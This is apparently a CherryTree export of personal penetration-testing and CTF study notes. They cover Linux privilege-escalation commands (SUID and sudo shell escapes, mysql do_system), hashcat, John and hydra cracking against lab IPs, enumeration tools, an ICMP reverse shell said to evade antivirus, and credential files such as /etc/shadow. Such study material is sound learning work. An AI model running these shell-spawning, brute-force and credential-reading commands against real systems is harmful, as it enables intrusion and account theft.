#     ~/.bashrc is loaded again and again, every time you open up a new terminal. So a new tab in gnome-terminal, a new virtual terminal, etc. So even if you don't login again, .bashrc is loaded (and thereby resets its environment) every time you open a new shell.
# 
#     Things like byobu should really go into .profile, (otherwise it won't work ;-)
# 
#     Things like paths should go into .profile if you want them to work outside of the interactive sessions. (say when you press Alt+F2 in GNOME)

#snap path addition

</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="#ffa500" is_bold="True" name="General Knowledge" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862761.15" ts_lastsave="1591016499.82" unique_id="116">
		<rich_text>
</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="sha1" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587063050.32" ts_lastsave="1587063050.32" unique_id="361">
			<rich_text>
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Network" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589599144.09" ts_lastsave="1589927272.58" unique_id="488">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Communication Protocol" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589599153.41" ts_lastsave="1589599153.87" unique_id="489">
				<rich_text>tcp or udp</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="ICMP protocol" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589868515.96" ts_lastsave="1589869001.77" unique_id="537">
				<rich_text>Internet Control Message Protocol
Ping requests work on the ICMP protocol
ICMP is not used for transferring data between network devices.
When a device wants to test connectivity to another device, it uses the PING tool (ICMP communication) to send an ECHO REQUEST and waits for an ECHO RESPONSE. 

Format:
look up &quot;ICMP Header Format&quot;
these echo packets end with '&amp;'()*+,- ./01234567' in hex format (without the apostrophes)

the packet does not contain source and destination port numbers like TCP and UDP header formats. Hence, echo request-response communication is taking place between the network devices, but not over specific port(s).

ICMP Shell can be found on GitHub here: </rich_text>
				<rich_text link="webs https://github.com/interference-security/icmpsh">https://github.com/interference-security/icmpsh</rich_text>
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="ICMP shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589869002.09" ts_lastsave="1589869183.46" unique_id="538">
					<rich_text>“icmp-s.c” is the slave file which is run on victim machine on which remote command execution is to be achieved. This C code, when compiled and executed, asks the user to enter required details as command line arguments.

“icmp-slave-complete.c” is the complete slave file which has hard-coded values of required details so that command line arguments are not needed and the compiled executable can be executed directly.

ICMP Shell requires the following details:

Line No.	Field	            Description
187	        target	            IP address of the attacker’s machine
189	        delay	            Delay between requests (milliseconds)
191	        timeout	            Timeout value (milliseconds)
195	        max_blanks	        Maximum unanswered ICMP requests
197	        max_data_size	    Maximum data buffer size in bytes

Make sure that ICMP replies set by the OS are disabled:
sysctl -w net.ipv4.icmp_echo_ignore_all=1 &gt;/dev/null

Its also not detected on virustotal.

more info here:</rich_text>
					<rich_text link="webs https://resources.infosecinstitute.com/icmp-reverse-shell/#gref">https://resources.infosecinstitute.com/icmp-reverse-shell/#gref</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="post / get" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589927272.9" ts_lastsave="1589927314.15" unique_id="562">
				<rich_text>GET method uses parameters in the link like ?id=text
POST method gets its data from forms in the .html, you can view those forms in page source</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Cryptography" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589861142.69" ts_lastsave="1589861805.42" unique_id="95">
			<rich_text></rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Ceasar cipher" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589861147.8" ts_lastsave="1589861150.67" unique_id="532">
				<rich_text></rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="rot13" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589861151.0" ts_lastsave="1589861151.0" unique_id="533">
				<rich_text></rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="base64" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862767.53" ts_lastsave="1589861155.15" unique_id="117">
				<rich_text>An encoding  algorithm.

Each Base64 digit represents exactly 6 bits of data.</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Behaviour" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862923.02" ts_lastsave="1570862984.89" unique_id="119">
					<rich_text>base64 encoded strings have to have a multiple of 4 characters, hence they sometimes have === paddings at the end of the string.</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Characters" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862821.34" ts_lastsave="1570863053.21" unique_id="118">
					<rich_text>Upper and lowercase letters
Numbers
+
/
=

These are the only characters base64 encoded strings have. They'll have more uppercase letters than lowercase.</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="base32" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589861284.63" ts_lastsave="1589861284.63" unique_id="534">
				<rich_text></rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="mds" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589861805.85" ts_lastsave="1589861807.97" unique_id="535">
				<rich_text>2
4
5
</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="C" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591016500.2" ts_lastsave="1591019493.93" unique_id="587">
			<rich_text>every c code has to have a main function

int main(int argc, char *argv[]){
    if(argc==2){
        printf(&quot;Knock, knock, %s\n&quot;, argv[1]);
    }
    else { 
        fprintf(stderr, &quot;Usage: %s &lt;name&gt;\n&quot;, argv[0]);
        return 1;
    }
    return 0;       //this means program exited WITHOUT an error.
}

//return 1 would mean program exited with an error
1st main param stands for &quot;argument count&quot;
2nd param is a &quot;list of argument vectors&quot; (whatever the fuk that means)
The argv can be supplied while running the program in the terminal.
matrix &quot;neo&quot;

You can analyze these args by printing argv[1] and 2 and so on. f.e. argv[0] is literally the program name itself(when you run it in terminal)

Compiling:
gcc matrix.c -o matrix
gcc matrix.c -o matrix -Wall        //enable all warnings</rich_text>
		</node>
		<node custom_icon_id="0" foreground="#be00ff" is_bold="True" name="Python" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862495.29" ts_lastsave="1592310180.77" unique_id="108">
			<rich_text>help(funcName) is basically a man page for functions</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Arguments" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570863644.23" ts_lastsave="1579247991.73" unique_id="120">
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="-c ''&quot;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570863648.27" ts_lastsave="1589931543.84" unique_id="121">
					<rich_text>executes python code inside the brackets in the terminal

Usage:
python -c &quot;print 'picoCTF {%s}' % 'EncodedString'.decode('base64')&quot;

no mouth winky boi trick(works on py2 &amp; py3):
python2 -c &quot;print('hey'); print('hi')&quot;</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Libraries" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862652.65" ts_lastsave="1587327806.84" unique_id="114">
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="base64" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862666.06" ts_lastsave="1570862680.1" unique_id="109">
					<rich_text>
</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="base64.b64decode('')" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862680.12" ts_lastsave="1570862686.11" unique_id="115">
						<rich_text>decodes base64 string inside the ‘’</rich_text>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="requests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587327806.99" ts_lastsave="1587327810.29" unique_id="389">
					<rich_text>for setting up scripts for a post/get request</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Core" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592310180.8" ts_lastsave="1592310186.55" unique_id="50">
				<rich_text></rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="lambda" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1592310186.58" ts_lastsave="1592310272.46" unique_id="51">
					<rich_text>def myfunc(n):
    print(n)
    return lambda a : a * n

mydoubler = myfunc(2)
mytripler = myfunc(3)

print(mydoubler)
print(mydoubler(11))
print(mytripler(11))

mydoubler becomes a function. Use lambda functions when an anonymous function is required for a short period of time.</rich_text>
				</node>
			</node>
		</node>
	</node>
	<node custom_icon_id="37" foreground="#000000" is_bold="True" name="Pentesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586539696.48" ts_lastsave="1592512827.79" unique_id="285">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Basic privesc techniques" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587259282.15" ts_lastsave="1587637554.25" unique_id="378">
			<rich_text>Good source: </rich_text>
			<rich_text link="webs https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="1. Kernel exploits" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587259658.1" ts_lastsave="1587481620.41" unique_id="383">
				<rich_text>uname -a</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="2. Exploiting services which are running as root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587259641.16" ts_lastsave="1587292086.94" unique_id="382">
				<rich_text>mysql running as root?
open mysql
select do_system('id &gt; /tmp/out; chown user.user /tmp/out')
\! sh
whoami


One of the biggest mistake web admins do, is to run a webserver with root privilege. A command injection vulnerability on the web application can lead an attacker to root shell. This is a classic example of why you should never run any service as root unless really required.
Binary exploits of a root owned program are far less dangerous than a kernel exploit because even if the service crashes, the host machine will not crash and the services will probably auto restart.</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="3. Exploiting SUID Executables" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587259603.3" ts_lastsave="1587292904.25" unique_id="381">
				<rich_text>By marking the ping program as SUID with the owner as root, ping executes with root privileges anytime a low privilege user executes the program.
</rich_text>
				<rich_text weight="heavy">&gt; -rwsr-xr-x– </rich_text>
				<rich_text>The ‘s’ character instead of ‘x’ indicates that the SUID bit is set.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
find / -perm -u=s -type f 2&gt;/dev/null
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SUID bit should not be set especially on any file editor as an attacker can overwrite any files present on the system.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&gt; In our example, Nmap has SUID bit set. A lot of times administrators set the SUID bit to nmap so that it can be used to scan the network efficiently as all the nmap scanning techniques does not work if you don’t run it with root privilege.
&gt; However, there is a functionality in nmap older versions where you can run nmap in an interactive mode which allows you to escape to shell. If nmap has SUID bit set, it will run with root privilege and we can get access to ‘root’ shell through it’s interactive mode.
$ nmap –interactive – runs nmap interactive mode
$ !sh – Lets you escape to the system shell from nmap shell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</rich_text>
				<rich_text underline="single">Countermeasures</rich_text>
				<rich_text>
• SUID bit should not be set to any program which lets you escape to the shell.
• You should never set SUID bit on any file editor/compiler/interpreter as an attacker can easily read/overwrite any files present on the system.
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="4. Exploiting SUDO rights/user" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587259508.93" ts_lastsave="1587259538.82" unique_id="380">
				<rich_text>$ sudo find /home -exec sh -i \; – find command’s exec parameter can be used for arbitrary code execution.

$ sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’ – spawns a shell

giving sudo to text editors, compilers, stuff that can exec shells are basically autopwn material</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="5. Exploiting badly configured cron jobs" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587233332.86" ts_lastsave="1587259393.09" unique_id="374">
				<rich_text link="webs https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs">https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="6. Exploiting users with ‘.’ in their PATH" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587259291.67" ts_lastsave="1587259318.06" unique_id="379">
				<rich_text>some add this to execute files without typing ./
the problem is that files become indistinguishable to commands
so if you can do that with a root user
bingo</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Brute Forcing / Cracking" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587637464.93" ts_lastsave="1589759597.85" unique_id="307">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="hashcat" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586677876.52" ts_lastsave="1592317569.3" unique_id="131">
				<rich_text>hashcat --example-hashes
hashcat -m 1800 FILE DICT

NOTE: you dont need to supply hashcat with a wordlist, but sometimes supplying rockyou is nice.
NOTE2: There is a good hash list in man page

Arguments:
--force             # use in a vm
--example-hashes    # lists crackable hashes
-m 0                # hash type
-o FILE             # output to file
-a 0                # attack-mode

Attack-mode:
• </rich_text>
				<rich_text link="webs https://hashcat.net/wiki/doku.php?id=dictionary_attack">Dictionary attack</rich_text>
				<rich_text> - trying all words in a list; also called “straight” mode (attack mode 0, </rich_text>
				<rich_text family="monospace">-a 0</rich_text>
				<rich_text>)
• </rich_text>
				<rich_text link="webs https://hashcat.net/wiki/doku.php?id=combinator_attack">Combinator attack</rich_text>
				<rich_text> - concatenating words from multiple wordlists (mode 1)
• </rich_text>
				<rich_text link="webs https://hashcat.net/wiki/doku.php?id=mask_attack">Brute-force attack</rich_text>
				<rich_text> and </rich_text>
				<rich_text link="webs https://hashcat.net/wiki/doku.php?id=mask_attack">Mask attack</rich_text>
				<rich_text> - trying all characters from given charsets, per position (mode 3)
• </rich_text>
				<rich_text link="webs https://hashcat.net/wiki/doku.php?id=hybrid_attack">Hybrid attack</rich_text>
				<rich_text> - combining wordlists+masks (mode 6) and masks+wordlists (mode 7); can </rich_text>
				<rich_text link="webs https://hashcat.net/wiki/doku.php?id=toggle_attack_with_rules">also be done with rules</rich_text>
				<rich_text>

Common hashes:
0               md5 no salt
900             md4 no salt
1800
1000            #NTLM - windows' meterpreter/hashdump format. lm hash+nt hash

WARNING: hashcat can't crack RSA passwords of private keys. 04.2020

~~~~~~~~~~~~~~~~~~~~~~~~~~~~WINDOWS~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hashcat64.exe -O -o pw.txt -m 1000 crackthis.hash rockyou.txt
pause

- or -

hashcat64.exe -O -m 1800 &quot;hashhere&quot; example.dict
pause
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="--example-hashes" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586677920.15" ts_lastsave="1586677951.79" unique_id="308">
					<rich_text>search through this by typing the source of the creds u got.</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="JohnTheRipper" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579249182.2" ts_lastsave="1589931282.77" unique_id="148">
				<rich_text>./john [ARGS] [OUTPUTFILE]
john --wordlist=~/files/rockyou.txt
DO supply john with a wordlist

Args:
--wordlist
--format=NAME       Force hashtype.
--list=formats      list hashtypes
--rules             word mangling rules

John DOES NOT need hash file conversion. But they &quot;sometimes&quot; need to be converted for john. You can use *2john.py scripts for that.

WARNING: johns &quot;password of private rsa keys&quot; crack is bugged: </rich_text>
				<rich_text link="webs https://github.com/magnumripper/JohnTheRipper/issues/4069">https://github.com/magnumripper/JohnTheRipper/issues/4069</rich_text>
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="/etc/shadow" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587061180.67" ts_lastsave="1587061198.33" unique_id="360">
					<rich_text>you can just feed etc shadow to john.
however you need to unshadow it first
hashcat doesnt have this problem</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="can crack zips" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587137492.05" ts_lastsave="1587138083.44" unique_id="367">
					<rich_text>zip2john exists as a sole program for some reaosn.
for some reason there is no .py file for it in the destined folder for *2john.pys.
weird
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Troubleshooting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579249325.28" ts_lastsave="1579249426.85" unique_id="149">
					<rich_text>
</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="if you run john twice and it get broke" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579249426.89" ts_lastsave="1579249430.38" unique_id="152">
						<rich_text>just delete the john.pot file.</rich_text>
					</node>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="THC hydra" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586712196.72" ts_lastsave="1589825866.56" unique_id="317">
				<rich_text>login cracker
this is basically a x100 faster version of the stupid python script I wrote to use for bruteforcing ssh with a dictionary attack in thm/basicpentesting

Usage:
hydra -l lucrisia -P /opt/rockyou.txt -vV ssh://192.168.0.103

website POST request:
hydra -I -l molly -P /opt/rockyou.txt 10.10.2.254 http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:F=incorrect&quot; -vV
hydra -l molly -P &lt;path-to-short-rockyou&gt; &lt;remote-ip&gt; http-post-form &quot;/login:username=^USER^&amp;password=^PASS^&amp;Login=Login:Your username or password is incorrect.&quot; -V

Arguments:
-l      #single username
-L      #file of usernames
-p      #single password
-P      #file of passwords
-I      #remove last save and start from the beginning
-R      #continue from the last save
-v      #verbose mode
-V      #show login+pass for each attempt
-d      #debug mode

NOTE: cracking website logins is hard:
Given that we’re going to be bruteforcing this site with Hydra, we need four things:
1. The method with which the website is sending our login attempts (most likely GET or POST) #This is the initial request, how the website sends form contents
2. The page to which the login details are being sent                  #This is the “Request URL” part of the post request
3. The request which the website is sending away to be evaluated       #This is the &quot;Form Data&quot; in the POST request in vivaldi.
4. A failed login message so that Hydra knows when it’s succeeded      #This is the error message that comes up on the webstie 

thm/lazyadmin:
1) POST
2) http://10.10.117.75/content/as/?type=signin&amp;timeStamp=1589825719790
3) user=test&amp;passwd=test2&amp;rememberMe=
4) Login failed


</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="hashid" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589759603.26" ts_lastsave="1589828391.63" unique_id="518">
				<rich_text>!!!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hash-identifier is better
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
!!!
THE PROGRAM TO DETERMINE WHAT TYPE OF HASHES THE HASHES ARE
the results are sometimes iffy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hashid -m &lt; hash 


Arguments:
  -e, --extended           list all possible hash algorithms including salted passwords
  -m, --mode               show corresponding Hashcat mode in output
  -j, --john               show corresponding JohnTheRipper format in output
  -o FILE, --outfile FILE  write output to file
  -h, --help               show this help message and exit
  --version                show program's version number and exit</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="hash-identifier" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589828410.85" ts_lastsave="1589828411.66" unique_id="530">
				<rich_text>hashid but better</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="burp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587325873.42" ts_lastsave="1591008360.28" unique_id="388">
			<rich_text>What is burp? It's a proxy client that is able to intercept, modify, analyze network data on the fly. It's also able to scan hosts. The paid version has auto scanners built-in.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
FILTERS MAN. USE EM!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Target:
Scope a URL belirtildiginde ve intercept client requests'ten AND URL Is in target scope tikli olcak proxy baska siteleri interceptlemiyor.
The folders created after filtering the scope in sitemap aren't actual folders.

Proxy
SSL pasthrough for SSL enforced websites?  
Intruder (send CTRL+I)
INTRUDER ALERT, INTRUDER ALERT, RED SPY IS IN THE BASE!
Intruder sniper attack tablarinda verinin gelme gitme suresini acip anomaly(olagan disi durum) aranabilir.

Repeater (send CTRL+R):
Websitesine geri donmeden requesti degistirip, response sourceuna bakmamiza yariyor.
Farkli responselar bekliyorsak responselari comparera gonderebiliriz (kisayolu yok ama atanabilir)

Sequencer

Decoder:
Cyberchef gibi bisey bu, decoderlari combolayabiliyosun, 2 kere url encode edebiliyosun ustuste mesela (bazi engelleri bypass ediyormus). B64 falan da yapabiliyosun (server anliyormu bunu xD)
Comparer

Extender:
Extensions wow



Url encode as you type.
Url encode hotkey: CTRL+U
Change request method
User agent can be chnaged automatically (Proxy options-&gt; Match and replace)
Kisayol atama: User options-&gt; Misc</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="intruder" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589648629.11" ts_lastsave="1589648635.27" unique_id="497">
				<rich_text>see -&gt; file upload .ext test</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Encryption" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587662538.26" ts_lastsave="1587664314.87" unique_id="444">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="gpg" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587662542.86" ts_lastsave="1587663250.66" unique_id="445">
				<rich_text>gpg -c data.txt         #encrypt
gpg -d data.txt.gpg     #decrypt</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Enumeration/Recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587497516.41" ts_lastsave="1589604764.45" unique_id="433">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586539738.18" ts_lastsave="1592498895.16" unique_id="286">
				<rich_text>nmap -sC -sV $ip | tee defnmap.txt                          # default scan without file clutter
nmap -sC -sV -p- -v $ip | tee allnmap.txt                   # all port scan without file clutter
nmap -sC -sV -p- --script vuln -vv $ip | tee vulnnmap.txt   # very verbose vuln scan without file clutter
nmap -sC -sV -oA z $ip                                      # default scan
nmap -sC -sV -oA z -p- $ip                                  # scan all ports
nmap -p- $ip | tee openports.txt                            # port scan ONLY

Args:
-v, -vv                     # verbosity
-sC                         # default scripts
-sV                         # enumerate versions
-oA z                       # output all file formats
-p &lt;start&gt; - &lt;end&gt;          # to specify a port range
--min-rate=10 		        # to speed things up, from twitter
-sS                         # SYN scan AKA stealth scan
-A                          # AGGRESSIVE, as much info as possible, LOUD
-O                          # OS
-T4                         # SPEED, 0, sneaky 1, polite 2, aggressive 4, insane 5 | higher=less accurate, more bandwidth
-Pn                         # no ping (Treat all hosts as online -- skip host discovery)
--script vuln               # runs vulnsearch scripts that are not part of default scripts. Can use * for wildcard. Also try locate .nse to cat them if you wanna take a look.
--script-help=vuln          # man for vuln scripts
-n                          # dont do dns resolution (ignores hosts!)
-sn                         # PING ONLY, just to ping multiple hosts
-sU                         # UDP scan

Tips:
--script smb*
locate .nse


Tips:
Skipping udp scans is a mistake, as exploitable UDP services are quite common and attackers certainly don't ignore the whole protocol. Fortunately, Nmap can help inventory UDP ports.
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="NSE" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589598853.9" ts_lastsave="1589598869.57" unique_id="487">
					<rich_text>--script category
categories found online, not on man
</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="enum4linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587481760.18" ts_lastsave="1587595366.59" unique_id="425">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="masscan" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587477613.35" ts_lastsave="1587595376.89" unique_id="420">
				<rich_text>nmap alternative</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="nikto" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587644281.22" ts_lastsave="1589871565.62" unique_id="359">
				<rich_text>VULN SCANNER
Nikto is a web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Args:
-h              # host. maybe. or help.
-host           
-id id:pw       # auth, basic host auth
-ssl            # force ssl
-nossl          
-nolookup       # disable dns

-plugins        # pluginname
-list-plugins
-update         # updates plugins

Plugins:
apacheusers     #Checks whether we can enumerate usernames directly from the web server. It has its own options in -list-plugins</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="linpeas" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587644385.55" ts_lastsave="1589937633.91" unique_id="363">
				<rich_text>./linpeas.sh | tee linpeas.log
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="gobuster" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586541495.93" ts_lastsave="1591103513.49" unique_id="291">
				<rich_text>gobuster dir -w ~/Downloads/SecLists-master/Discovery/Web-Content/big.txt -l -u </rich_text>
				<rich_text link="webs http://$ip:3000">http://$ip</rich_text>
				<rich_text> -x php, txt, html | tee gobuster.log
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -l -u </rich_text>
				<rich_text link="webs http://$ip:3000">http://$ip:3000</rich_text>
				<rich_text> | tee gobuster.log
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -l -u </rich_text>
				<rich_text link="webs http://$ip">http://$ip</rich_text>
				<rich_text> -x php | tee gobuster.log

Arguments(mostly dir args):
-U &amp; -P	            # Username and Password for Basic Auth
-u                  # http://$ip:port
-c cookiestring	    # Specify a cookie for auth
-x php              # extension (php,txt,html)
-w                  # wordlist
-l                  # length of body
-r                  # follow redirects
-k                  # skip ssl
-a                  # user agent (gobuster/3.0.1)
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="dirsearch" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589604764.7" ts_lastsave="1590016014.5" unique_id="496">
				<rich_text>similiar to gobuster
multi-threaded

dude this shit runs at lightning speed compared to gobuster, just saw it on optionals stream</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Fuzzing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589604194.06" ts_lastsave="1589758794.21" unique_id="494">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="file upload .ext test" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589604205.96" ts_lastsave="1589668107.25" unique_id="495">
				<rich_text>launch burp
intercept file upload
send to intruder
go to options and give the extensions to be tested
go back and launch a sniper attack
don’t forget to disable the encode options</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="got shell access, what next?" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586720838.97" ts_lastsave="1589758809.39" unique_id="324">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589758809.69" ts_lastsave="1589758809.69" unique_id="513">
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name=".bash_history" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587234139.76" ts_lastsave="1589758813.09" unique_id="377">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="/etc/passwd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586720847.01" ts_lastsave="1589758814.6" unique_id="325">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="/etc/shadow" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586720892.05" ts_lastsave="1589758815.84" unique_id="327">
					<rich_text>root access only, obviously.</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="/etc/sudoers" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587233286.68" ts_lastsave="1589758817.05" unique_id="373">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="enumerate" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586720937.77" ts_lastsave="1589758819.13" unique_id="328">
					<rich_text>linenum or linpeas
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="su users" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587233216.8" ts_lastsave="1589758820.76" unique_id="369">
					<rich_text>[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password </rich_text>
				</node>
